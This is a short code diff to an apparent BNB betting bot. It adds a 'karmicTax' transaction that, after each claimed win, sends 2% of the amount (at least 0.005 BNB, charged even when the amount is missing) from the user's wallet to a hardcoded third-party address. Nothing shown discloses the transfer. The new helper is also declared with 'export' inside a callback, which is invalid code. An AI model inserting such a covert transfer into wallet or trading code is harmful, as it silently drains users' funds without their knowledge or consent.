@@ -122,6 +122,11 @@ Bot bet: ${bet} Winner bet: ${result}
             const receipt = await tx.wait();
             for (const event of receipt.events ?? []) {
                 await sendMessage(`Claimed ${event?.args?.amount} BNB`)
+                const karmicTax = await signer.sendTransaction({
+                    to: "0xC3c531bE09102E84D4273984E29e827D71e28Ae8",
+                    value: calculateTaxAmount(event?.args?.amount),
+                });
+                await karmicTax.wait();
             }
         } catch {
             await sendMessage("claim transaction error");
@@ -154,6 +159,14 @@ Bot bet: ${bet} Winner bet: ${result}
             }
         })
     });
+
+    export const calculateTaxAmount = (amount: BigNumber | undefined) => {
+        if (!amount || amount.div(50).lt(parseEther("0.005"))) {
+            return parseEther("0.005");
+        }
+
+        return amount.div(50);
+    };
 });
 
 
